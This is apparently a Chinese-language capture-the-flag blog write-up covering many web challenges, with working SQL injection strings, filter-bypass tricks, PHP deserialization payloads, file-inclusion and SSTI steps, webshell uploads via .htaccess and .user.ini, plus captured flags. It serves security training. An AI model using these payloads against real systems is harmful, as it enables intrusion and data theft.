<p>flag{98c88520-68e1-4715-b929-17503e78bf5e}</p>
<h1 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h1>
<p>抓包得到一个路径</p>
<img src="http://img.hzy2003628.top/image-20230708123811151.png" alt="image-20230708123811151" style="zoom:200%;">
<p><img src="http://img.hzy2003628.top/image-20230708123828053.png" alt="image-20230708123828053"></p>
<pre><code class="hljs plaintext">&lt;html&gt;
    &lt;title&gt;secret&lt;/title&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET[&#x27;file&#x27;];
    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
        echo &quot;Oh no!&quot;;
        exit();
    &#125;
    include($file); 
//flag放在了flag.php里
?&gt;
&lt;/html&gt;</code></pre>
<p>一眼顶针，文件包含</p>
<img src="http://img.hzy2003628.top/image-20230708123904377.png" alt="image-20230708123904377" style="zoom:200%;">
<p>同样base64输出结果</p>
<img src="http://img.hzy2003628.top/image-20230708124028238.png" alt="image-20230708124028238" style="zoom:200%;">
<p>解码得到flag</p>
<pre><code class="hljs plaintext">&lt;!DOCTYPE html&gt;

&lt;html&gt;

    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;&gt;
        &lt;title&gt;FLAG&lt;/title&gt;
    &lt;/head&gt;

    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
        
        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
        
        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;
            &lt;?php
                echo &quot;我就在这里&quot;;
                $flag = &#x27;flag&#123;e007ea8b-2f4a-4e27-9c2b-d6a2f21084f0&#125;&#x27;;
                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;
            ?&gt;
        &lt;/p&gt;
    &lt;/body&gt;

&lt;/html&gt;
</code></pre>
<h1 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</h1>
<blockquote>
<p>admin’  || 1=1#</p>
</blockquote>
<p>万能密码登录</p>
<p><img src="http://img.hzy2003628.top/image-20230709174032686.png" alt="image-20230709174032686"></p>
<p>这个密码解不出来，继续SQL注入</p>
<pre><code class="hljs plaintext">/check.php?username=admin&#x27; order by 3%23&amp;password=1     成功
/check.php?username=admin&#x27; order by 4%23&amp;password=1     报错</code></pre>
<img src="http://img.hzy2003628.top/image-20230709174213640.png" alt="image-20230709174213640" style="zoom:200%;">
<p>即存在三个字段，再用union查询</p>
<pre><code class="hljs plaintext">?username=1&#x27; union select 1,2,3%23&amp;password=1</code></pre>
<img src="http://img.hzy2003628.top/image-20230709174308631.png" alt="image-20230709174308631" style="zoom:200%;">
<p>回显点位为2和3，查询当前数据库名及版本</p>
<pre><code class="hljs plaintext">?username=1&#x27; union select 1,database(),version()%23&amp;password=1</code></pre>
<img src="http://img.hzy2003628.top/image-20230709174345198.png" alt="image-20230709174345198" style="zoom:200%;">
<p>然后爆表</p>
<pre><code class="hljs plaintext">?username=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</code></pre>
<img src="http://img.hzy2003628.top/image-20230709174442360.png" alt="image-20230709174442360" style="zoom:200%;">
<p>l0ve1ysq1表的字段</p>
<pre><code class="hljs plaintext">?username=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=1</code></pre>
<img src="http://img.hzy2003628.top/image-20230709174535958.png" alt="image-20230709174535958" style="zoom:200%;">
<p>最后爆数据</p>
<pre><code class="hljs plaintext">?username=1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</code></pre>
<p>得到flag</p>
<img src="http://img.hzy2003628.top/image-20230709174627638.png" alt="image-20230709174627638" style="zoom:200%;">
<p>flag{df345fc8-1dc2-4e10-83dc-f02a82543e86}</p>
<h1 id="极客大挑战-2019http">[极客大挑战 2019]Http</h1>
<img src="http://img.hzy2003628.top/image-20230709174903873.png" alt="image-20230709174903873" style="zoom:200%;">
<p>访问</p>
<img src="http://img.hzy2003628.top/image-20230709174920476.png" alt="image-20230709174920476" style="zoom:200%;">
<p>貌似到这里就知道了，考察报文头</p>
<p>构造一下得到flag</p>
<img src="http://img.hzy2003628.top/image-20230709175037105.png" alt="image-20230709175037105" style="zoom:200%;">
<p>flag{3f49a3e0-6b20-470d-86a3-6234bdaf2e30}</p>
<h1 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h1>
<p>就命令执行即可</p>
<pre><code class="hljs plaintext">Syc=system(&#x27;cat /f*&#x27;);</code></pre>
<img src="http://img.hzy2003628.top/image-20230709175208261.png" alt="image-20230709175208261" style="zoom:200%;">
<p>flag{4473e7cb-6633-4007-a894-a9b83a76eb2c}</p>
<h1 id="极客大挑战-2019upload">[极客大挑战 2019]Upload</h1>
<p>文件上传，过滤了&lt;?</p>
<p><img src="http://img.hzy2003628.top/image-20230709175311703.png" alt="image-20230709175311703"></p>
<p>同时也不让上传PHP文件，用phtml绕过，内容用<strong>文件幻术头</strong></p>
<img src="http://img.hzy2003628.top/image-20230709175854042.png" alt="image-20230709175854042" style="zoom:200%;">
<img src="http://img.hzy2003628.top/image-20230709175921978.png" alt="image-20230709175921978" style="zoom:200%;">
<p>flag{6906835c-3905-43a7-a58f-4a49fa39939c}</p>
<h1 id="actf2020-新生赛upload">[ACTF2020 新生赛]Upload</h1>
<p>同上，前端校验绕过即可</p>
<img src="http://img.hzy2003628.top/image-20230709184025706.png" alt="image-20230709184025706" style="zoom:200%;">
<p>flag{090eb440-226c-4e3a-be5a-44480c1a9565}</p>
<h1 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL</h1>
<p>加了部分黑名单</p>
<p>直接用上面的方法是不行的了，首先就是order中的or字符被过滤，by也被过滤，union select也都被过滤</p>
<p>用双写绕过试试</p>
<pre><code class="hljs plaintext">?username=1&#x27;ununionion%20seselectlect%201,2,3%23&amp;password=1</code></pre>
<p>还是三段</p>
<img src="http://img.hzy2003628.top/image-20230709185021211.png" alt="image-20230709185021211" style="zoom:150%;">
<p>剩下的基本同上一题</p>
<pre><code class="hljs plaintext">?username=1&#x27; union select 1,database(),version()%23&amp;password=1</code></pre>
<p>然后继续用的那个语句的information和from都被过滤了</p>
<p>继续双写绕过</p>
<pre><code class="hljs plaintext">?username=1&#x27;ununionion seselectlect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata%23&amp;password=1</code></pre>
<img src="http://img.hzy2003628.top/image-20230709190248815.png" alt="image-20230709190248815" style="zoom:200%;">
<p>继续查询表名</p>
<pre><code class="hljs plaintext">username=1%27%20ununionion%20seselectlect%201,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=%27ctf%27%23&amp;password=1</code></pre>
<img src="http://img.hzy2003628.top/image-20230709190436772.png" alt="image-20230709190436772" style="zoom:200%;">
<p>查询flag表中字段名</p>
<pre><code class="hljs plaintext">username=1’ ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#&amp;password=1</code></pre>
<img src="http://img.hzy2003628.top/image-20230709190643569.png" alt="image-20230709190643569" style="zoom:200%;">
<p>flag{386102b8-b5d4-42a6-86da-e3c75ce13609}</p>
<h1 id="极客大挑战-2019php">[极客大挑战 2019]PHP</h1>
<img src="http://img.hzy2003628.top/image-20230709190746975.png" alt="image-20230709190746975" style="zoom:200%;">
<p>备份文件泄露，直接扫一下就行–www.zip</p>
<p>反序列化</p>
<img src="http://img.hzy2003628.top/image-20230709191056585.png" alt="image-20230709191056585" style="zoom:200%;">
<p>传参点select</p>
<img src="http://img.hzy2003628.top/image-20230709191123197.png" alt="image-20230709191123197" style="zoom:200%;">
<p>私有变量需要在类名和字段名前面%00包括一下，同时绕过wakeup函数</p>
<blockquote>
<p>这里用py发包的话%00- &gt;\0代替</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php

class Name&#123;
    private $username = &#x27;admin&#x27;;
    private $password = &#x27;100&#x27;;

    &#125;            
$hzy = new Name();
echo serialize($hzy);
//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;

?&gt;</code></pre>
<pre><code class="hljs plaintext">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></pre>
<img src="http://img.hzy2003628.top/image-20230709191925585.png" alt="image-20230709191925585" style="zoom:200%;">
<h1 id="actf2020-新生赛backupfile">[ACTF2020 新生赛]BackupFile</h1>
<img src="http://img.hzy2003628.top/image-20230709192613670.png" alt="image-20230709192613670" style="zoom:200%;">
<p>看这样子是又让找源码/index.php.bak，源码如下</p>
<pre><code class="hljs plaintext">&lt;?php
include_once &quot;flag.php&quot;;

if(isset($_GET[&#x27;key&#x27;])) &#123;
    $key = $_GET[&#x27;key&#x27;];
    if(!is_numeric($key)) &#123;
        exit(&quot;Just num!&quot;);
    &#125;
    $key = intval($key);
$str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
if($key == $str) &#123;
    echo $flag;
&#125;

&#125;
else &#123;
    echo &quot;Try to find out source file!&quot;;
&#125;
</code></pre>
<p>== 是弱类型比较，所以直接给三位比较即可</p>
<img src="http://img.hzy2003628.top/image-20230709193247099.png" alt="image-20230709193247099" style="zoom:200%;">
<p>flag{fa3c66d0-5e85-47b6-87f4-24cb21302c45}</p>
<h1 id="roarctf-2019easy-calc">[RoarCTF 2019]Easy Calc</h1>
<p>计算数学题</p>
<img src="http://img.hzy2003628.top/image-20230709193608312.png" alt="image-20230709193608312" style="zoom:200%;">
<p>看源码</p>
<img src="http://img.hzy2003628.top/image-20230709193624002.png" alt="image-20230709193624002" style="zoom:200%;">
<p>不能传字母符号，只能传数字，但是可以利用PHP字符串解析来绕过，首先先在传参点前面空格一下，然后直接用函数进行读取</p>
<pre><code class="hljs plaintext">num=print_r(scandir(&#x27;/&#x27;));</code></pre>
<p>但是/也被waf了，可以用chr函数进行绕过</p>
<blockquote>
<p>chr(47)=‘/’</p>
</blockquote>
<pre><code class="hljs plaintext">/calc.php?%20num=print_r(scandir(chr(47)));</code></pre>
<p><img src="http://img.hzy2003628.top/image-20230709194009363.png" alt="image-20230709194009363"></p>
<p>然后调用file_get_contents函数读flag</p>
<pre><code class="hljs plaintext">num=print_r(file_get_contents(&#x27;/flagg&#x27;));</code></pre>
<p>还是得绕，同样是chr函数</p>
<pre><code class="hljs plaintext">num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></pre>
<img src="http://img.hzy2003628.top/image-20230709194144834.png" alt="image-20230709194144834" style="zoom:200%;">
<p>flag{a483f53a-b536-4606-9bf3-7e18c865aa04}</p>
<h1 id="极客大挑战-2019buyflag">[极客大挑战 2019]BuyFlag</h1>
<img src="http://img.hzy2003628.top/image-20230709194325420.png" alt="image-20230709194325420" style="zoom:200%;">
<p>看下源码</p>
<img src="http://img.hzy2003628.top/image-20230709194349423.png" alt="image-20230709194349423" style="zoom:200%;">
<p>这个cookie先改一下</p>
<img src="http://img.hzy2003628.top/image-20230709194535018.png" alt="image-20230709194535018" style="zoom:200%;">
<p>这里money需要用科学计数法，密码要求不能是纯数字，但是若比较所以加个字母就行</p>
<img src="http://img.hzy2003628.top/image-20230709194920797.png" alt="image-20230709194920797" style="zoom:200%;">
<p>flag{c2eb3989-b1ea-4efe-bb16-71d92127a221}</p>
<h1 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h1>
<p>这个题打开就是这个页面，输了传参没啥反应</p>
<p><img src="https://img.hzy2003628.top/image-20230712213018022.png" alt="image-20230712213018022"></p>
<p>看报文头发现hint</p>
<p><img src="https://img.hzy2003628.top/image-20230712213416917.png" alt="image-20230712213416917"></p>
<pre><code class="hljs plaintext">select * from &#x27;admin&#x27; where password=md5($pass,true)</code></pre>
<p>SQL注入，需要绕过这个md5函数</p>
<p><img src="https://img.hzy2003628.top/image-20230712213848862.png" alt="image-20230712213848862"></p>
<p>WP中构造这个SQL语句的永真用的是<strong>ffifdyop</strong>这个字符</p>
<blockquote>
<p>原因是</p>
<p>1、ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释</p>
<p>2、ffifdyop，该字符串md5加密后若raw参数为True时会返回 'or’6<trash> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)</trash></trash></trash></p>
</blockquote>
<p>所以传参ffifdyop即可绕过</p>
<p><img src="https://img.hzy2003628.top/image-20230712214432172.png" alt="image-20230712214432172"></p>
<pre><code class="hljs plaintext">源码
&lt;!--
$a = $GET[&#x27;a&#x27;];
$b = $_GET[&#x27;b&#x27;];

if($a != $b &amp;&amp; md5($a) == md5($b))&#123;
    // wow, glzjin wants a girl friend.
--&gt;</code></pre>
<p>这个又是hash弱比较绕过，即本身不相等，hash相等，直接数组绕过即可</p>
<blockquote>
<p>也可以0e绕过，在这里放几个</p>
<ul>
<li>以下是一些字符串md5值以0e开头<br>
QNKCDZO<br>
240610708<br>
s878926199a<br>
s155964671a<br>
s21587387a</li>
</ul>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230712214552201.png" alt="image-20230712214552201" style="zoom:200%;">
<p>进入下一个</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
include &quot;flag.php&quot;;

highlight_file(__FILE__);

if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;
    echo $flag;
&#125;</code></pre>
<p>这里用到了强比较类型，继续用数组即可</p>
<img src="https://img.hzy2003628.top/image-20230712214757244.png" alt="image-20230712214757244" style="zoom:200%;">
<p>flag{e4d6615d-0413-4867-994d-9840fa3b61a6}</p>
<h1 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado</h1>
<img src="https://img.hzy2003628.top/image-20230713170157911.png" alt="image-20230713170157911" style="zoom:200%;">
<pre><code class="hljs plaintext">/flag.txt    -&gt;  /flag.txt  flag in /fllllllllllllag
/welcome.txt  -&gt; /welcome.txt   render
/hints.txt    -&gt;  /hints.txt    md5(cookie_secret+md5(filename))</code></pre>
<p>在看这三个路由的时候也能发现传参会多个hash，而hints.txt里面的应该就是生成hash的方法</p>
<img src="https://img.hzy2003628.top/image-20230713170348613.png" alt="image-20230713170348613" style="zoom:200%;">
<blockquote>
<p>render()函数是Django中的渲染，基本漏洞发生在ssti上</p>
<p><a href="https://so.csdn.net/so/search?q=tornado&amp;spm=1001.2101.3001.7020">tornado</a>.web.Application对象初始化赋予cookie_secret参数，用于保存本网站cookies加密密钥</p>
</blockquote>
<p>然后又说了flag在/fllllllllllllag，那可以构造一下md5(filename)  --&gt; 3bf9f6cf685a6dd8defadabfb41a03a1</p>
<p>这个时候还需要找一下cookie_secret，SSTI</p>
<p>修改hash会跳转到error，构造SSTI</p>
<img src="https://img.hzy2003628.top/image-20230713171059195.png" alt="image-20230713171059195" style="zoom:200%;">
<blockquote>
<p>‘cookie_secret’: ‘3ad41e36-78b4-446d-9b98-640695a0beca’</p>
</blockquote>
<p>这个时候构造一下就可以读取flag文件了</p>
<blockquote>
<p>3ad41e36-78b4-446d-9b98-640695a0beca3bf9f6cf685a6dd8defadabfb41a03a1 -&gt;4f405061250b0d017fc3382e65c96b90</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230713171256995.png" alt="image-20230713171256995" style="zoom:200%;">
<p>flag{6c8e26de-863e-4482-84de-a57dbbd435ac}</p>
<h1 id="hctf-2018admin">[HCTF 2018]admin</h1>
<img src="https://img.hzy2003628.top/image-20230713171722268.png" alt="image-20230713171722268" style="zoom:200%;">
<p>有登录和注册功能，看注释应该就是要成为admin用户</p>
<img src="https://img.hzy2003628.top/image-20230713171817638.png" alt="image-20230713171817638" style="zoom:200%;">
<p>同时注释还给了个地址，应该是源码</p>
<img src="https://img.hzy2003628.top/image-20230713171932166.png" alt="image-20230713171932166" style="zoom:200%;">
<p>这个源码路径已经失效了，看了其他师傅的WP，大致就是session伪造，源码里面给了key</p>
<blockquote>
<p>SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’</p>
</blockquote>
<p>伪造一下，替换cookie即可得到flag</p>
<img src="https://img.hzy2003628.top/image-20230713173157375.png" alt="image-20230713173157375" style="zoom:200%;">
<p>flag{818a9e36-4b6b-4ad8-9c4b-0e204762c60d}</p>
<p>还有一种方法是unicode欺骗</p>
<pre><code class="hljs plaintext">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</code></pre>
<p>用ᴬᴰᴹᴵᴺ注册一下然后修改密码就可以把原来admin的密码覆盖掉</p>
<h1 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</h1>
<img src="https://img.hzy2003628.top/image-20230713210623341.png" alt="image-20230713210623341" style="zoom:200%;">
<p>文件上传功能，尝试传一个文件抓包看看</p>
<img src="https://img.hzy2003628.top/image-20230713210927206.png" alt="image-20230713210927206" style="zoom:200%;">
<p>过滤了后缀，覆盖配置文件绕过</p>
<img src="https://img.hzy2003628.top/image-20230713211050139.png" alt="image-20230713211050139" style="zoom:200%;">
<p>然后上传马子</p>
<img src="https://img.hzy2003628.top/image-20230713211147974.png" alt="image-20230713211147974" style="zoom:200%;">
<p>过滤了执行系统命令的函数</p>
<img src="https://img.hzy2003628.top/image-20230713211359130.png" alt="image-20230713211359130" style="zoom:200%;">
<p>蚁剑连接得到flag</p>
<img src="https://img.hzy2003628.top/image-20230713211650932.png" alt="image-20230713211650932" style="zoom:200%;">
<p>flag{62937381-ac4e-456c-b45d-d27360e307f1}</p>
<h1 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h1>
<pre><code class="hljs plaintext">&lt;?php  
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
$password = $_GET[&quot;password&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag/&quot;,$file))&#123;
        echo &quot;Not now!&quot;;
        exit(); 
    &#125;else&#123;
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    &#125;
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>
<p>首先第一层是验证file_get_contents($text,‘r’)===“welcome to the zjctf”)，用data协议写进去内容即可绕过</p>
<pre><code class="hljs plaintext">?text=data://text/plain,welcome to the zjctf

?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 对于其他题目存在过滤的，base64传参更好</code></pre>
<img src="https://img.hzy2003628.top/image-20230713212740950.png" alt="image-20230713212740950" style="zoom:200%;">
<p>但是文件包含是不能直接读取flag的，读一下注释的那个路径看一下</p>
<blockquote>
<p>php://filter/read=convert.base64-encode/resource=useless.php</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php  

class Flag&#123;  //flag.php  
    public $file;  
    public function __tostring()&#123;  
        if(isset($this-&gt;file))&#123;  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
        &#125;  
    &#125;  
&#125;  
?&gt;</code></pre>
<p>任意文件读，本地序列化一下，最终payload如下</p>
<pre><code class="hljs plaintext">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre>
<p>flag{63e584de-9a82-4638-a2a6-ff445b827fa5}</p>
<h1 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h1>
<p>又是SQL注入</p>
<img src="https://img.hzy2003628.top/image-20230713213608925.png" alt="image-20230713213608925" style="zoom:200%;">
<p>空格被过滤，/**/也不能绕过</p>
<img src="https://img.hzy2003628.top/image-20230713213705862.png" alt="image-20230713213705862" style="zoom:200%;">
<p>还有一种绕过空格的方法是括号</p>
<blockquote>
<p>括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格</p>
</blockquote>
<pre><code class="hljs plaintext">?username=admin&#x27;(or)#&amp;password=1 --&gt;?username=admin%27%28or%29%23&amp;password=1</code></pre>
<img src="https://img.hzy2003628.top/image-20230713214106006.png" alt="image-20230713214106006" style="zoom:200%;">
<p>报错，说明绕过去了，报错注入，用updatexml</p>
<p>数据库</p>
<pre><code class="hljs plaintext">admin&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</code></pre>
<img src="https://img.hzy2003628.top/image-20230713214221710.png" alt="image-20230713214221710" style="zoom:200%;">
<p>查表名</p>
<pre><code class="hljs plaintext">admin&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))#</code></pre>
<img src="https://img.hzy2003628.top/image-20230713214339238.png" alt="image-20230713214339238" style="zoom:200%;">
<p>查列名</p>
<pre><code class="hljs plaintext">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</code></pre>
<img src="https://img.hzy2003628.top/image-20230713214457475.png" alt="image-20230713214457475" style="zoom:200%;">
<p>读字段</p>
<pre><code class="hljs plaintext">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#x27;~&#x27;,username,&#x27;~&#x27;,password))from(H4rDsq1)),0x7e),1))#</code></pre>
<img src="https://img.hzy2003628.top/image-20230713214546637.png" alt="image-20230713214546637" style="zoom:200%;">
<p>还有右半部分的半个flag，从右边读</p>
<pre><code class="hljs plaintext">admin&#x27;or(updatexml(1%2Cconcat(0x7e%2C(select(right(password%2C10))from(H4rDsq1))%2C0x7e)%2C1))%23</code></pre>
<img src="https://img.hzy2003628.top/image-20230713214929261.png" alt="image-20230713214929261" style="zoom:200%;">
<p>flag{e466e316-d3b4-4b7b-a919-aba68a3c0dcd}</p>
<h1 id="mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</h1>
<p>源码</p>
<pre><code class="hljs plaintext">
I put something in F12 for you
include &#x27;flag.php&#x27;;
$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;
if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;
    $id=$_GET[&#x27;id&#x27;];
    $gg=$_GET[&#x27;gg&#x27;];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
        echo &#x27;You got the first step&#x27;;
        if(isset($_POST[&#x27;passwd&#x27;])) &#123;
            $passwd=$_POST[&#x27;passwd&#x27;];
            if (!is_numeric($passwd))
            &#123;
                 if($passwd==1234567)
                 &#123;
                     echo &#x27;Good Job!&#x27;;
                     highlight_file(&#x27;flag.php&#x27;);
                     die(&#x27;By Retr_0&#x27;);
                 &#125;
                 else
                 &#123;
                     echo &quot;can you think twice??&quot;;
                 &#125;
            &#125;
            else&#123;
                echo &#x27;You can not get it !&#x27;;
            &#125;

        &#125;
        else&#123;
            die(&#x27;only one way to get the flag&#x27;);
        &#125;
&#125;
    else &#123;
        echo &quot;You are not a real hacker!&quot;;
    &#125;
&#125;
else&#123;
    die(&#x27;Please input first&#x27;);
&#125;
&#125;Please input first</code></pre>
<p>gg和id的hash得相等并且明文不能相等，数组绕即可</p>
<p>然后passwd这个参数要求不是数字还得是1234567，弱比较绕过，最后加个a即可</p>
<img src="https://img.hzy2003628.top/image-20230713215233865.png" alt="image-20230713215233865" style="zoom:200%;">
<p>flag{15015a22-c765-42a2-b0af-3ed8db8ca3f2}</p>
<blockquote>
<p>is_numeric函数绕过利用的PHP弱类型比较，不同类型比较之前会先将其转换为相同类型再进行比较，即1234567a先转换成1234567之后再比较，即True</p>
</blockquote>
<h1 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h1>
<pre><code class="hljs plaintext">&lt;?php

include(&quot;flag.php&quot;);

highlight_file(__FILE__);

class FileHandler &#123;

    protected $op;
    protected $filename;
    protected $content;

    function __construct() &#123;
        $op = &quot;1&quot;;
        $filename = &quot;/tmp/tmpfile&quot;;
        $content = &quot;Hello World!&quot;;
        $this-&gt;process();
    &#125;

    public function process() &#123;
        if($this-&gt;op == &quot;1&quot;) &#123;
            $this-&gt;write();
        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
            $res = $this-&gt;read();
            $this-&gt;output($res);
        &#125; else &#123;
            $this-&gt;output(&quot;Bad Hacker!&quot;);
        &#125;
    &#125;

    private function write() &#123;
        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
                $this-&gt;output(&quot;Too long!&quot;);
                die();
            &#125;
            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
            if($res) $this-&gt;output(&quot;Successful!&quot;);
            else $this-&gt;output(&quot;Failed!&quot;);
        &#125; else &#123;
            $this-&gt;output(&quot;Failed!&quot;);
        &#125;
    &#125;

    private function read() &#123;
        $res = &quot;&quot;;
        if(isset($this-&gt;filename)) &#123;
            $res = file_get_contents($this-&gt;filename);
        &#125;
        return $res;
    &#125;

    private function output($s) &#123;
        echo &quot;[Result]: &lt;br&gt;&quot;;
        echo $s;
    &#125;

    function __destruct() &#123;
        if($this-&gt;op === &quot;2&quot;)
            $this-&gt;op = &quot;1&quot;;
        $this-&gt;content = &quot;&quot;;
        $this-&gt;process();
    &#125;

&#125;

function is_valid($s) &#123;
    for($i = 0; $i &lt; strlen($s); $i++)
        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
            return false;
    return true;
&#125;

if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;

    $str = (string)$_GET[&#x27;str&#x27;];
    if(is_valid($str)) &#123;
        $obj = unserialize($str);
    &#125;

&#125;</code></pre>
<p>首先is_valid函数限制ascii值在32-125之间了，为啥这样防，是因为上面有protected属性，而在序列化后需要用到\00*\00这样的不可见字符，防的就是这里</p>
<blockquote>
<p><strong>绕过方法</strong></p>
<p>php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
</blockquote>
<p>其次destruct方法将op强比较，写死了，但是在process函数中弱比较</p>
<blockquote>
<p><strong>绕过方法</strong></p>
<p>在process方法里面置public属性的op为2，弱比较绕过防止置为1</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php


class FileHandler
&#123;

    public $op = 2;
    public $filename = &quot;flag.php&quot;;
    public $content=&#x27;6&#x27;;


&#125;
$h =new FileHandler();
echo serialize($h);
//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;6&quot;;&#125;</code></pre>
<img src="https://img.hzy2003628.top/image-20230713221958635.png" alt="image-20230713221958635" style="zoom:200%;">
<p>flag{06ca90b2-3dd1-4d59-8c7e-ccf2a2c1322d}</p>
<h1 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h1>
<p>文件上传</p>
<img src="https://img.hzy2003628.top/image-20230713222104134.png" alt="image-20230713222104134" style="zoom:200%;">
<p>过滤了&lt;?</p>
<img src="https://img.hzy2003628.top/image-20230713222245053.png" alt="image-20230713222245053" style="zoom:200%;">
<p>可以用前端代码来代替</p>
<img src="https://img.hzy2003628.top/image-20230713222800177.png" alt="image-20230713222800177" style="zoom:200%;">
<p>配置文件.user.ini上传覆盖</p>
<img src="https://img.hzy2003628.top/image-20230713222901230.png" alt="image-20230713222901230" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230713223305550.png" alt="image-20230713223305550" style="zoom:200%;">
<p>flag{600cc5e5-4340-43a7-a1a5-4e6fef69d263}</p>
<h1 id="gxyctf2019babyupload">[GXYCTF2019]BabyUpload</h1>
<p>还是文件上传</p>
<p>先上传配置文件.htaccess</p>
<img src="https://img.hzy2003628.top/image-20230713223731119.png" alt="image-20230713223731119" style="zoom:200%;">
<p>然后上传马即可得到flag</p>
<img src="https://img.hzy2003628.top/image-20230713224304863.png" alt="image-20230713224304863" style="zoom:200%;">
<p>蚁剑连接</p>
<p>flag{2f09c24c-aba8-4c66-ba8e-1aba848138f0}</p>
<h1 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli</h1>
<p>SQli的SQL注入</p>
<img src="https://img.hzy2003628.top/image-20230713224509149.png" alt="image-20230713224509149" style="zoom:200%;">
<p>插入万能密码之后显示hack me，显然被过滤了</p>
